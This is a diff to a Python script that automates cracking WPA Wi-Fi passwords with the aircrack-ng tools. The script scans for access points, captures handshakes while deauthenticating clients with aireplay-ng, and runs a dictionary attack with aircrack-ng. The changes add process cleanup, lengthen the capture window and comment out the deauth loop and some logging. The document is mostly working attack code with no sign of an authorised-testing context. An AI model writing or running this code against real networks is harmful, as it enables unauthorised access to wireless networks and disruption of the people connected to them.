@@ -45,6 +45,9 @@ verbose = False
 # Prompt user for scan times before scanning
 # Default: False
 promptScanTime = False
+
+# List of all running processes (to kill in cleanUp())
+procs = []
 ###############################################################
 
 
@@ -302,6 +305,7 @@ def getTargetAccessPoint():
 
 def scanAccessPoints(interfaceName, channel='0', scanTime=5):
 	global packetPath
+	global procs
 
 	# Allow user to select an AP (access point) by MAC address
 	print("Scanning for access points...")
@@ -316,6 +320,7 @@ def scanAccessPoints(interfaceName, channel='0', scanTime=5):
 	scan_command += " " + interfaceName
 	# scan networks
 	airodump = bash_command(scan_command, stdout=out, stderr=err)
+	procs.append(airodump)
 
 	# wait for airodump to dump AP csv list
 	timeStart = time.time()
@@ -425,7 +430,7 @@ def captureHandshake():
 
 	# listen for a WPA handshake, run for given amount of time, deauthing
 	# clients meanwhile
-	scanTime = '10'
+	scanTime = '40'
 	if promptScanTime:
 		while not scanTime.isdigit():
 			scanTime = input("Time limit to listen for WPA handshake (seconds): ")
@@ -438,34 +443,35 @@ def captureHandshake():
 	scan_command += " " + interfaceName
 	# dump packets to/from target AP
 	# airodump_proc = bash_command(scan_command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-
-	airodump_proc = bash_command(scan_command, stdout=None, stderr=None)
+	airodump_proc = bash_command(scan_command, stdout=None, stderr=None, stdin=None)
+	procs.append(airodump_proc)
 
 	timeStart = time.time()
 	# keep scanning until we get a WPA handshake
 	f = open('log.txt','w')
 	while True:
 		# check if we've captured a handshake
-		proc = bash_command("aircrack-ng -w " +dictionaryPath+" " + packetPath+"packet-01.cap", stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+		proc = bash_command("aircrack-ng -w " +dictionaryPath+" " + packetPath+"packet-01.cap", stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 		try:
 			outs, errs = proc.communicate(timeout=1)
-		except TimeoutExpired:
+		except subprocess.TimeoutExpired:
 			proc.kill()
 			outs, errs = proc.communicate()
 
+		# Deauthenticate clients until a handshake appears in the packet dump
 		if not ('No networks found' in outs.decode('utf-8') or
 				'no data packets from target' in outs.decode('utf-8') or
 				'No valid WPA handshakes' in outs.decode('utf-8')):
 			break
-		# Deauthenticate clients until a handshake appears in the packet dump
-		client_list = scanClientsAtAccessPoint()
-		for client in client_list:
-			deauthenticateClient(client)
+		# client_list = scanClientsAtAccessPoint()
+		# for client in client_list:
+		# 	deauthenticateClient(client)
+
 		if time.time()-timeStart > int(scanTime):
 			break
 
 	print("terminating airodump")
-	airodump_proc.terminate()
+	airodump_proc.kill()
 
 
 def scanClientsAtAccessPoint(scanTime=5):
@@ -475,10 +481,10 @@ def scanClientsAtAccessPoint(scanTime=5):
 	global interfaceName
 
 	# Allow user to select an AP (access point) by MAC address
-	if not targetESSID:
-		print("Scanning clients connected to access point " + targetBSSID + "...")
-	else:
-		print("Scanning clients connected to access point " + targetESSID + "...")
+	# if not targetESSID:
+	# 	print("Scanning clients connected to access point " + targetBSSID + "...")
+	# else:
+	# 	print("Scanning clients connected to access point " + targetESSID + "...")
 
 	# wait for airodump to dump client csv list
 	timeStart = time.time()
@@ -511,17 +517,17 @@ def deauthenticateClient(clientMacAddress):
 	global interfaceName
 	global channel
 
-	if not targetESSID:
-		print("Deauthenticating client " + clientMacAddress + " at AP " + targetBSSID)
-	else:
-		print("Deauthenticating client " + clientMacAddress + " at AP " + targetESSID)
+	#if not targetESSID:
+	#	print("Deauthenticating client " + clientMacAddress + " at AP " + targetBSSID)
+	#else:
+	#	print("Deauthenticating client " + clientMacAddress + " at AP " + targetESSID)
 
 	aireplay_proc = bash_command("aireplay-ng" + 
 			" -0 1" + # send 1 deauth packet
 			" -a " + targetBSSID +
 			" -c " + clientMacAddress +
 			" " + interfaceName)
-	print(aireplay_proc.stdout.read().decode('utf-8').strip())
+	#print(aireplay_proc.stdout.read().decode('utf-8').strip())
 
 
 def validMacAddress(address):
@@ -533,13 +539,18 @@ def crackHandshake():
 	global dictionaryPath
 	global packetPath
 
-	process = bash_command("aircrack-ng -w " + dictionaryPath + " -b " + targetBSSID + " " + packetPath + "packet-01.cap", stdout=None, stderr=None)
+	process = bash_command("aircrack-ng -w " + dictionaryPath + " -b " + targetBSSID + " " + packetPath + "packet-01.cap", stdout=None, stderr=None, stdin=None)
 	process.wait()
 
 
 def cleanUp():
+	global procs
+
 	if os.path.exists(packetPath):
 		shutil.rmtree(packetPath)
+	for proc in procs:
+		if proc:
+			proc.kill()
 
 asciiAirEmblem = '''\
         ***********                    
